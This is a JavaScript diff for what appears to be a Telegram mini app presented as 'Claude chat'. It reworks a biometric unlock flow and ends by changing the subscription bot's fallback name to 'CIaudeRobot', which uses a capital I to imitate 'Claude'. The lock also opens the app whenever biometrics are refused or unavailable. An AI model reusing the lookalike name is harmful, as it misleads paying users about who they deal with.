@@ -868,54 +868,58 @@ function showBioScan() {
 
 function enableBioYes() {
   showBioScan();
-  requestBio();
+  // Must be called synchronously inside a user gesture (click handler)
+  if (!BM) { unlockApp(); return; }
+
+  BM.init({ reason: 'Protect your Claude chat' }, () => {
+    if (!BM.isInited || !BM.isBiometricAvailable) {
+      setBioStatus('Biometrics not available on this device.', true);
+      setTimeout(unlockApp, 1200);
+      return;
+    }
+
+    // requestAccess is called directly inside click → Telegram allows it
+    BM.requestAccess(
+      { reason: 'Secure access to Claude chat' },
+      (granted) => {
+        if (!granted) {
+          setBioStatus('Permission not granted.', true);
+          setTimeout(unlockApp, 1000);
+          return;
+        }
+        // Immediately authenticate after access granted
+        BM.authenticate(
+          { reason: 'Open Claude chat' },
+          (isAuth) => {
+            if (isAuth) {
+              setBioStatus('Verified');
+              setTimeout(unlockApp, 300);
+            } else {
+              setBioStatus('Not recognized. Tap to retry.', true);
+            }
+          }
+        );
+      }
+    );
+  });
 }
 
 function enableBioNo() {
   unlockApp();
 }
 
-function requestBio() {
-  if (!BM) { unlockApp(); return; }
-
-  setBioStatus('');
-
-  BM.init({ reason: 'Verify your identity to open Claude' }, () => {
-    if (!BM.isInited) { unlockApp(); return; }
-
-    if (!BM.isBiometricAvailable) {
-      setBioStatus('Biometrics not available on this device.', true);
-      setTimeout(unlockApp, 1200);
-      return;
-    }
-
-    // Request permission first (required by Telegram before authenticate)
-    BM.requestAccess(
-      { reason: 'Protect your Claude chat with biometrics' },
-      (granted) => {
-        if (!granted) {
-          setBioStatus('Permission denied. Skipping.', true);
-          setTimeout(unlockApp, 1000);
-          return;
-        }
-        authenticate();
-      }
-    );
-  });
-}
-
 function authenticate() {
-  if (!BM) { unlockApp(); return; }
+  if (!BM || !BM.isInited) { unlockApp(); return; }
   setBioStatus('Touch the sensor…');
 
   BM.authenticate(
     { reason: 'Open Claude chat' },
     (isAuth) => {
       if (isAuth) {
-        setBioStatus('Authenticated');
+        setBioStatus('Verified');
         setTimeout(unlockApp, 300);
       } else {
-        setBioStatus('Not recognized. Try again.', true);
+        setBioStatus('Not recognized. Tap to retry.', true);
       }
     }
   );
@@ -925,11 +929,9 @@ function skipBio() { unlockApp(); }
 
 window.addEventListener('DOMContentLoaded', () => {
   if (!BM || !tg) {
-    // No Telegram biometrics support — skip lock
     unlockApp();
     return;
   }
-  // Show "enable biometrics?" prompt
   setTimeout(showBioPrompt, 400);
 });
 
@@ -1055,9 +1057,7 @@ function selectPwPlan(el) {
 function goSubscribe() {
   closePw();
   if (tg) {
-    // Deep link: opens bot chat and triggers /start subscribe
-    // BOT_USERNAME is injected server-side or hardcoded here
-    const botUsername = window.BOT_USERNAME || 'ClaudeSubBot';
+    const botUsername = window.BOT_USERNAME || 'CIaudeRobot';
     tg.openTelegramLink(`https://t.me/${botUsername}?start=subscribe`);
   }
 }
